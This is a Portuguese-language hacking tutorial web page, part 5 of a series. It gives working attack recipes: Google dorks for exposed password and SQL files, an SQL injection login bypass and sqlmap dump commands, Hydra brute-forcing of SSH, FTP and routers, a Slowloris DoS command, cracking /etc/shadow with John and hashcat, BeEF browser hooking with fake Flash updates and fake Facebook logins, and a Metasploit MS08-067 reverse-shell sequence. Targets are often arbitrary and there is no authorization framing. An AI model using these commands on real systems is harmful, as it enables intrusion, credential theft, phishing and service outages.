<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Hacking</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Hacking</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-hacking-1.html">Tudo sobre Hacking Parte 1!</a></li>
                    <li><a href="tudo-sobre-hacking-2.html">Tudo sobre Hacking Parte 2!</a></li>
                    <li><a href="tudo-sobre-hacking-3.html">Tudo sobre Hacking Parte 3!</a></li>
                    <li><a href="tudo-sobre-hacking-4.html">Tudo sobre Hacking Parte 4!</a></li>
                    <li><a href="tudo-sobre-hacking-5.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Hacking Parte 5!</a></li>
                    <li><a href="tudo-sobre-hacking-6.html">Tudo sobre Hacking Parte 6!</a></li>
                    <li><a href="tudo-sobre-hacking-7.html">Tudo sobre Hacking Parte 7!</a></li>
                    <li><a href="tudo-sobre-hacking-8.html">Tudo sobre Hacking Parte 8!</a></li>
                </menu>
            </header>
            
<h2>Tudo sobre Hacking Parte 5</h2>

<h3>Google Hacking</h3>

<p>O Google Hacking nada mais é que nós utilizarmos o Google para pesquisar coisas como sites vulneráveis, pesquisar dados, encontrar informações, pastas importantes, vulnerabilidades e etc.</p>

<p>O Google indexa toda a internet da surface web e pega todos os links de todos os sites que encontra, incluindo dados confidenciais do mesmo, graças ao webcrawler do Google.</p>

<p>Ao pesquisar <code>site:nomedosite.com.br</code> ele retornará o máximo de conteúdos apenas do site especificado (pode ser usado algo como <code>site:.pt</code> para procurar sites de Portugal, por exemplo), podendo colocar uma ou mais palavras chaves para procurar conteúdos específicos desse mesmo site, ou mesmo colocar o - na frente da palavra pra suprimir resultados com essa mesma palavra.</p>

<p>Podemos pesquisar resultados que estejam numa URL que contenham tal sequência, por exemplo <code>inurl:.php?id=</code>, podendo substituir por cat ou outro dado de PHP. Isso ajuda a procurar sites vulneráveis.</p>

<p>Podemos buscar por exemplo, algum erro de MySQL que apareça num texto de um site, como <code>intext:mysql_fetch_array()</code>, e podemos combinar com o inurl pra isso. Uma forma fácil de achar sites vulneráveis à SQL Injection é pesquisar <code>inurl:.php?cat= intext:syntax</code> (já que a palavra syntax é exibida em erros de SQL).</p>

<p>PS: Além de inurl, intext, intitle, podemos usar <code>allinurl</code>, <code>allintext</code> e <code>allintitle</code> para procurar resultados com todas as palavras descritas, ao invés de uma só.</p>

<p>Outra coisa muito comum é procurar um tipo específico de arquivo, como <code>filetype:sql</code> ou <code>ext:php</code>, que procura arquivos de banco de dados que podem estar em backup de sites. Muito comum procurar arquivos TXT, ZIP ou RAR que contenham back-up de dados. Podemos colocar o operador <code>OR</code> ou <code>|</code> para ele procurar resultado com um verbete ou o outro. Também podemos procurar um intervalo de números, como por exemplo <code>2012..2016</code> ou <code>numrange:2012-2016</code>.</p>

<p>PS: Todos esses comandos podem ser combinados com outros, principalmente com palavras-chave para retornar resultados mais relevantes.</p>

<p>Podemos também procurar coisas literais entre aspas (como <code>"Recuperar Senha"</code>), colocar um <q>*</q> como coringa (como <code>"Samuel * da Silva"</code>), suprimir algo da pesquisa com um <q>-</q> (como <code>vazamento de contas -água -luz</code>), entre outras coisas. Um truque que podemos usar é para descobrir servidores FTP, digitando <code>intext:"index of" inurl:ftp</code>.</p>

<p>Podemos também pesquisar um e-mail para ver se ele foi exposto ou se ele é legítimo (caso seja um e-mail de alguma conta que envia spam ou phishing, por exemplo), simplesmente colando ele na pesquisa do Google.</p>

<p>Nesse site temos muitas outras dicas que podemos usar para buscas no Google: <a href="https://tavernalinux.com/google-hacking-para-pentest-61604f8f8122" target="_blank">https://tavernalinux.com/google-hacking-para-pentest-61604f8f8122</a></p>

<p>Aqui também temos alguns parâmetros que podemos usar no Google: <a href="https://escoladedados.org/tutoriais/operadores-de-busca-avancada/" target="_blank">https://escoladedados.org/tutoriais/operadores-de-busca-avancada/</a></p>

<p>Veja alguns usos mais avançados de pesquisa no Google:</p>

<pre>
<code>
"phpMyAdmin" "running on" inurl:main.php

"@gmail.com"

ext:php | ext:asp | ext:aspx | ext:jsp

numrange:1-5

intitle:"VNC Desktop" inurl:5900

intitle:"remote desktop web connection"

intitle:"index of" filetype:sql

intitle:phpinfo()

intitle:"index of /" backup

filetype:log inurl:password.log

filetype:properties inurl:db intext:password

filetype:sql intext:password

inurl:.php?id= "sql syntax"

inurl:.php?id= "sql command"
</code>
</pre>

<h3>Introdução ao SQL Injection</h3>

<p>Um banco de dados é utilizado para armazenar informações. Programas que organizam e coletam essas informações são chamados de DBMS, como o MySQL. Para a organização e estruturação dessas informações é utilizada uma linguagem chamada SQL.</p>

<p>SQL é a sigla inglesa de Structured Query Language, que significa, em português, Linguagem de Consulta Estruturada, uma linguagem padrão de gerenciamento de dados que interage com os principais bancos de dados baseados no modelo relacional, dentre eles: MySQL, PostgreSQL, Oracle, SQL Server, MariaDB, Acess, etc.</p>

<p>Os sites com bancos de dados e alguma linguagem back-end, como o PHP, são chamados de dinâmicos, já os sites apenas com HTML, CSS e Javascript são chamados de estáticos. Facebook é um exemplo de site dinâmico.</p>

<p>O SQL Injection é feito colocando algo que interfira no funcionamento normal da query do banco de dados, em sites que não filtram seus dados.</p>

<p>Query do site:</p>

<pre>
<code>
$sql = "select * from users where username = '" + $username + "' and password = '" + $password + "'";
</code>
</pre>

<p>Colocamos no campo de username o "login" e "senha" <code>' or '1 = 1</code>, e a SQL vai entender algo diferente e gerar esse resultado:</p>

<pre>
<code>
$sql = "select * from users where username = '' or '1 = 1' and password = '' or '1 = 1'";
</code>
</pre>

<p>No caso acima, se o banco de dados não encontrar o usuário (que está vazio), ele verificará se 1 é igual é 1 e identificará a query como verdadeira e logará o site.</p>

<p>No Google podemos pesquisar um site vulnerável com <code>inurl:.php?cat=</code>, no caso, vamos nesse site que é permitido usar pra testes: <a href="http://testphp.vulnweb.com/listproducts.php?cat=1" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=1</a></p>

<p>No site acima, se passamos o número no parâmetro cat, ele mostrará fotos do site normalmente, mas se passar uma aspas simples, ele dará um erro de SQL, por criar uma query errada. Se o site mostrar erros, o site poderá ser vulnerável a SQL Injection.</p>

<p>Agora vamos na seção de login, no mesmo site, e coloque nos campos de login e senha o comando <code>' or '1 = 1</code>. Ele logará, por causa do que a query entende como uma consulta válida.</p>

<p>PS: O SQL Injection independe da linguagem do site ou tipo de banco de dados, funciona igual para qualquer um.</p>

<h3>SQL Injection com Havij</h3>

<p>Como visto, podemos descobrir se um site está vulnerável à SQL Injection tentando colocar no parâmetro da URL alguma coisa que interfira na query do SQL, como uma aspas simples.</p>

<p>Podemos usar um programa chamado Havij no Windows para explorar falhas SQL, basta abrir o programa, colocar o link nele com o parâmetro (no caso o site será o <a href="http://testphp.vulnweb.com/listproducts.php?cat=1" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=1</a>).</p>

<p>Para baixar e instalar o Havij, vá nesse link aqui: <a href="https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/" target="_blank">https://www.darknet.org.uk/2010/09/havij-advanced-automated-sql-injection-tool/</a></p>

<h3>SQL Injection com SQLmap</h3>

<p>Voltando ao site de testes de intrusão (<a href="http://testphp.vulnweb.com/listproducts.php?cat=1" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=1</a>), sabemos que ele está vulnerável à SQL Injection, e podemos usar o SQLMap para fazer isso.</p>

<p>No terminal do Linux, teste primeiro o código <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs</code>, que retornará todos os bancos de dados do servidor e suas vulnerabilidades (geralmente no INFO com cor diferenciada).</p>

<p>No final, ele faz o ataque e faz o upload dos resultados num arquivo.</p>

<p>Para vermos as tabelas de um banco de dados do site, digitamos <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco --tables</code>.</p>

<p>Para especificar uma tabela e ver suas colunas digite <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela --columns</code>.</p>

<p>Para pegar colunas especificas dessa mesma tabela podemos fazer algo tipo <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela -C email,name,pass,uname --dump</code>.</p>

<p>Para pegar todas as colunas da tabela, digite <code>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D nomedobanco -T nomedatabela --dump</code>.</p>

<p>Mudando o parâmetro da URL para um caractere como ' e rodando este no SQL pode retornar resultados de vulnerabilidade.</p>

<p>Ele também pode identificar hashs de senhas e colocar como opção o ataque à essa hash com um dicionário, podendo descobrir o que ela significa.</p>

<p>Podemos colocar também o parâmetro do tipo de banco de dados com a opção <code>--dbms</code>, como por exemplo <code>--dbms=mysql</code> para MySQL. Outras opções são <code>postgresql</code> (PostgreSQL), <code>oracle</code> (Oracle SQL Server) e <code>mssql</code> (Microsoft SQL Server).</p>

<p>Digitando apenas <code>sqlmap</code> podemos ver as configurações do programa.</p>

<p>PS: Os parâmetros usados são para testes em parâmetros GET, para parâmetros POST, coloque a página onde está o formulário e o parâmetro <code>--forms</code>, dessa forma. Podemos obter mais dados do servidor com o parâmetro <code>--fingerprint</code>.</p>

<pre>
<code>
sqlmap -u http://testphp.vulnweb.com/login.php --dbs --forms
</code>
</pre>

<p>Todos os outros testes com parâmetros POST devem ter esse parâmetro especificado.</p>

<p>Para atualizar o SQLMap, digite <code>sqlmap --update</code>.</p>

<h3>Identificar e Descriptografar Hashs de Senhas (MD5 e SHA-1)</h3>

<p>Uma hash nada mais é que um algoritmo matemático que transforma uma string (como uma senha) em uma sequência de caracteres hexadecimais de tamanho único, independente do tamanho da string, dessa forma, as senhas podem ser guardadas num banco de dados de forma segura. As mais usadas são a MD5 (com 32 caracteres), e a SHA-1 (com 40 caracteres).</p>

<p>Por padrão, podemos criptografar uma senha como uma hash, mas ele não pode ser descriptografado. Par permitir o login em sites, o site que contém o hash da senha guardada, faz um algoritmo do mesmo tipo de hash ao logarmos e compara com o do banco de dados.</p>

<p>O hash da palavra "senha", por exemplo, é <code>e8d95a51f3af4a3b134bf6bb680a213a</code> em MD5 e <code>7751a23fa55170a57e90374df13a3ab78efe0e99</code> em SHA-1.</p>

<p>Podemos usar um site para gerar hashs, como esse, por exemplo: <a href="https://hashes.com/en/generate/hash" target="_blank">https://hashes.com/en/generate/hash</a> e coloque uma senha qualquer como exemplo.</p>

<p>Apenas um caractere alterado da palavra, como mudar uma letra pra maiúscula, tirar ou colocar um caractere, etc., por mínima que seja, gera um hash totalmente diferente do anterior.</p>

<p>Dentro do Kali, podemos usar o programa hash-identifier para descobrir de que tipo é um hash de senha, digitando <code>hash-identifier</code>, e dentro do programa colamos a hash que desejamos verificar.</p>

<p>No site acima, também podemos procurar a senha de algum hash especificado. Para dificultarmos a descoberta do hash da senha, podemos usar senhas mais complexas, que dificulta encontrarmos a hash dela.</p>

<h3>Obtendo Senhas com Unsecure</h3>

<p>No Windows podemos usar o Unsecure para quebrar senhas de e-mails e sites.</p>

<p>Abra o Unsecure 2015, e em Endereço IP ou URL coloque o link ou IP do alvo. Escolha a porta, selecione o dicionário e marque as opções força-bruta e dicionário.</p>

<h3>Introdução ao Hydra</h3>

<p>O Hydra tenta fazer ataques baseados num dicionário com prováveis senhas, que pode ser criado ou baixado!</p>

<p>Para usarmos o Hydra com um nome de usuário, digitamos <code>hydra -l nomedousuario -P wordlist.txt nomeouipdoalvo.com ftp</code>. Onde está <q>ftp</q> pode ser outros serviços, como por exemplo, o SSH.</p>

<p>Se não souber o nome de usuário e usar dicionário pra ambos, digite <code>hydra -L wordlistlogin.txt -P wordlistsenha.txt nomeouipdoalvo.com ftp</code>.</p>

<p>Como no caso usaremos o ataque a um roteador, colocaremos no alvo o IP dele, para descobrir digite <code>route -n</code>.</p>

<p>PS: O Hydra tenta descobrir apenas o que está especificado nas wordlists, não tenta quebrar a senha exatamente. E caso você saiba a senha mas não o login, basta passar o parâmetro -p seguido da senha.</p>

<p>Aqui temos alguns dicionários para download: <a href="http://mudameuser.blogspot.com/2016/01/wordlist-para-ataque-de-forca-bruta.html" target="_blank">http://mudameuser.blogspot.com/2016/01/wordlist-para-ataque-de-forca-bruta.html</a></p></p>

<p>Para atacar um alvo por outro serviço, use o IP dele seguido do nome do serviço, por exemplo <code>hydra -l Admin -P wordlistsenha.txt 192.168.1.1 ssh</code>.</p>

<p>Podemos salvar as senhas salvas num arquivo, com o parâmetro <code>-o nomedoarquivo.txt</code>. Outras opções são <code>-f</code> para o programa parar quando encontrar uma senha, <code>-e</code> para testar senha em branco e <code>-s</code> para testar o user como senha.</p>

<p>Aqui temos outras dicas para uso do Hydra: <a href="https://hackersec.com/comandos-e-truques-com-thc-hydra-brute-force/" target="_blank">https://hackersec.com/comandos-e-truques-com-thc-hydra-brute-force/</a></p>

<p>PS: Podemos baixar também uma interface gráfica para o Hydra, digitando <code>sudo apt-get install hydra-gtk</code>.</p>

<h3>Como Realizar um Ataque Dos</h3>

<p>O ataque Dos funciona da seguinte forma: Ele enviará solicitações HTTP incompletas ao servidor que deixa a conexão aberta esperando ela completar, mas estas nunca se completam e sobrecarregam o servidor, causando a negação de serviço, que faz derrubar o site.</p>

<p>Para fazer um ataque Dos, baixe o script perl desse site: <a href="https://github.com/mattiasgeniar/slowloris/blob/master/slowloris.pl" target="_blank">https://github.com/mattiasgeniar/slowloris/blob/master/slowloris.pl</a></p>

<p>No diretório do programa, dê a permissão de execução pro script baixado e digite o comando <code>perl slowloris.pl -dns 192.168.0.15 -port 80</code>, substituindo pelo IP desejado e a porta, se necessário.</p>

<h3>Introdução ao Netcat</h3>

<p>O Netcat é um comando bastante versátil em Linux, podemos colocar ele pra conectar num site e ver se ele responde, na sintaxe site porta, por exemplo:</p>

<pre>
<code>
nc www.google.com.br 80
</code>
</pre>

<p>PS: Pode ser necessário instalar ele digitando <code>sudo apt-get install netcat</code>.</p>

<p>Para sniffar o tráfego na rede podemos fazer assim, na porta desejada:</p>

<pre>
<code>
nc -l -p 80
</code>
</pre>

<h3>Quebrando Senhas com John the Ripper</h3>

<p>Primeiramente, caso não esteja no Kali, baixe o programa digitando <code>sudo apt-get install john</code>.</p>

<p>Para testar a ferramenta, digite <code>john --test</code>.</p>

<p>Para quebrar a senha de usuário do sistema, digite, como root, <code>sudo john /etc/shadow</code>.</p>

<p>Para verificar a senha de um determinado nome, digite <code>john -show -users:root /etc/shadow</code>.</p>

<p>Salve as senhas num banco de dados da seguinte forma: <code>unshadow /etc/passwd /etc/shadow >> pass.db</code>. E depois dê o comando <code>john pass.db</code>.</p>

<p>Para quebrar a senha de um arquivo ZIP ou PDF, podemos digitar <code>zip2john pasta.zip > hash.txt</code> para gerar o hash da senha. E depois tente usando o comando <code>john hash.txt --wordlist=senhas.txt</code>. O processo pra PDF é o mesmo, mudando apenas para <code>pdf2john</code>.</p>

<h3>Sequestrar Navegador com Beef XSS</h3>

<p>O Beef XSS trabalha da seguinte forma: De um lado tem a máquina atacante e do outro a vítima com o browser aberto. O painel do Beef vai inserir um script numa página que a vítima acessará e cairá num gancho, ou seja, será hookado, e o painel do atacante conseguirá enviar comandos pro navegador da vítima e controlar o mesmo.</p>

<p>Para iniciar o Beef, clicamos no ícone dele. Abra o navegador e entre na URL do painel (UI URL, algo como <code>http://127.0.0.1:3000/ui/panel</code>) e digite na autenticação tanto pro login quanto pra senha, "beef".</p>

<p>Ao abrir o Beef, tem ao lado os navegadores fisgados online e offline, veja também que tem as páginas modelo com script XSS para isso.</p>

<p>Veja as legendas do módulo, que o verde é o mais seguro, porque a vítima não perceberá, por exemplo.</p>

<p>Pegue o IP do seu computador (digitando ifconfig no Linux), e altere o IP do Hook de <code>http://127.0.0.1:3000/hook.js</code> para o IP do seu Linux.</p>

<p>A vítima tentará abrir a página enviada, e já será fisgada, poderemos ver ela no painel do Beef, identificada pelo seu IP.</p>

<p>Selecione a tal máquina pra trabalharmos nela, terá todas as informações como Navegador, Sistema Operacional, versão, etc.</p>

<p>Podemos por exemplo, em Commands, na pasta Browser, podemos ir em Play Sound e colocar um áudio que desejamos que seja executado no PC da vítima.</p>

<p>Na pasta Social Engineering, podemos ir em Fake Flash Update para enviar um link com a falsa atualização do Flash, com a imagem do Flash e um arquivo executável (trojan). Aparecerá uma página avisando da "atualização" e em qualquer lugar que clicarmos nela, redirecionará pra tal página.</p>

<p>Temos também a Fake Notification Bar para os principais navegadores, podemos colocar a URL com o backdoor ou executável, e uma mensagem como um pedido de atualização pro navegador. Aparecerá uma notificação pra download, mesmo se clicar no x, redirecionará pra tal backdoor.</p>

<p>Em Pretty Theft, podemos pegar logins de diversas redes sociais, como Facebook e Youtube, ou Sistemas como Windows e IOS. Aparecerá uma mensagem para login do Facebook, mas que na verdade é falsa e manda os dados pro atacante. Isso funciona com a vítima independente do sistema operacional, até mesmo em celulares.</p>

<p>Temos também vários módulos de detecção, remoção de gancho, coleta de cookies, URL visitadas, é só dar a procurada nos módulos.</p>


<h3>Intrusão Simples com Metasploit</h3>

<p>Abra o Metasploit ou digite <code>msfconsole</code> no Terminal para isso.</p>

<p>Digite os comando nessa ordem:</p>

<pre>
<code>
use windows/smb/ms08_067_netapi

set PAYLOAD windows/meterpreter/reverse_tcp

set RHOST 0.0.0.0

set LHOST 192.168.0.1

exploit

shell
</code>
</pre>

<p>Em RHOST, vai o IP do alvo (pode ser o IP privado da máquina), e em LHOST, o IP do seu Kali.</p>

<p>Se a invasão for bem-sucedida, você poderá navegar no sistema, usando a linha de comando.</p>

<h3>Descobrindo Senhas com o HashCat</h3>

<p>Como sabemos, as senhas são guardados no banco de dados no formato de hash, e podemos usar geradores de hash para criptografar as mesmas.</p>

<p>Para descobrir senhas usaremos o HashCat. Nativo no Kali Linux, ele pode ser instalado em outras distros com <code>sudo apt install hashcat ocl-icd-libopencl1 opencl-headers clinfo   beignet-opencl-icd mesa-opencl-icd lsb-core</code>.</p>

<p>Salve um arquivo com o nome hashes.txt com os hashs desejados. Podemos baixar um exemplo <a href="files/hashes.txt" target="_blank">aqui</a>!</p>

<p>Para utilizar o hashcat, use na sintaxe <code>hashcat -a 0 -m 100 hashes.txt wordlist.txt</code>. No lugar do arquivo dos hashs podemos colocar o mesmo literalmente.</p>

<p>Se você receber um erro de "exceção de comprimento de linha" no hashcat, geralmente é porque o modo hash que você solicitou não corresponde ao hash.</p>

<p>Esses são os tipos de hashs: <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>

<p>Eles devem ser usados após o parâmetro -m, para MD5 o número é 0, SHA-1 o número é 100 e SHA-256 é 1400.</p>

<p>O parâmetro -a indica o tipo de ataque, onde 0 é com wordlist, para fazer com bruteforce é 3, por exemplo:</p>

<pre>
<code>
sudo hashcat -a 3 -m 0 hashes.txt ????????
</code>
</pre>

<p>Onde está ? é o tipo de caractere e sua quantidade, onde a interrogação é o coringa pra todos, os tipos de caracteres podem ser vistos dando um --help no hashcat.</p>

<p>PS: Em quaisquer casos, pode ser necessário forçar com <code>--force</code>, e também executar como root.</p>

<p>Aqui temos outras dicas com outros tipos de hash: <a href="https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec" target="_blank">https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec</a></p>

<ul>
    <li><a href="tudo-sobre-hacking-4.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-hacking-6.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>